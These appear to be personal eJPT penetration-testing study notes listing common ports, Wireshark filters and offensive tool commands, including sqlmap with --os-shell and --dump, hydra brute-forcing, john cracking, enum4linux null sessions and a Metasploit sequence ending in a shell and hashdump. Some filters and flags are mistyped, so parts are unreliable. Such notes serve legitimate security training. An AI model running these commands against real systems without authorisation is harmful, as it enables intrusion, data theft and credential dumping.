eJPT Notes :

\-->Common ports

\-----------------------------------------

25 - SMTP

22 - SSH

110 - POP3

143 - IMAP

80 - HTTP

443 - HTTPS

137, 138, 139 - NETBIOS

115 - SFTP

23 - Telnet

21 - FTP

3389 - RDP

3306 - MySQL

1433 - MS SQL Server

\--> How to set route

\-----------------------------------------

ip route add <Network To Which We Need Access> via <GATEWAY>

ex,

ip route add 192.168.1.0/24 via 10.10.15.1

\--> Wireshark Filters

\-----------------------------------------

Wireshark Filter by IP --> ip.add == 10.10.10.9

Filter by Destination IP --> ip.dest == 10.10.10.9

Filter by Source IP --> ip.src == 10.10.50.1

Filter by port --> tcp.port == 25

Filter by ip adress and port --> ip.addr == 10.10.50.1 and Tcp.port == 25

Filter SYN flag --> Tcp.flags.syn == 1

Tcp.flags.syn == 1 and tcp.flags.ack ==0

Wireshark broadcast filter --> eth.dst == ff:ff:ff:ff:ff:ff

\-->Whois

\-----------------------------------------

whois <site.com>

\-->Ping Sweep

\-----------------------------------------

nmap -sn <IP>/24

\-->Banner Grabbing

\-----------------------------------------

nc -nv <IP> <port>

\-->Directory and File Scanning

\-----------------------------------------

dirsearch.py -u http://IP -e \*

gobuster dir -u http://IP/folder -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

\-->Nmap

\-----------------------------------------

nmap -p- <IP address>

nmap -sC -sV -p21,22,445 <IP address>

nmap -sC -sV -p- <IP address>

nmap --script vuln <IP address>

All Nmap script on this path : /usr/share/nmap/scripts

\-->Cross Site Scripting (XSS)

\-----------------------------------------

Learn XSS from the lab examples.

\-->SQLMap

\-----------------------------------------

sqlmap -u http://<IP address> -p parameter

sqlmap -u http://<IP address> –os-shell

sqlmap -u http://<IP address> –dump

\-->Cracking Password

\-----------------------------------------

john -wordlist /path/to/wordlist -users=users.txt hashfile

\-->Hydra

\-----------------------------------------

hydra -L users.txt -P pass.txt -t 10 <IP address> ssh -s 22

Replace "ssh" with any service name

\-->Windows Shares Using Null sessions

\-----------------------------------------

enum4linux -a <IP address>

\-->Metasploit

\-----------------------------------------

search x

use x

show options

set LHOST <IP address>

set RHOST <IP address>

set payload <xxxxxx>

exploit

upload x C:\\\\Windows

shell

use post/windows/gather/hashdump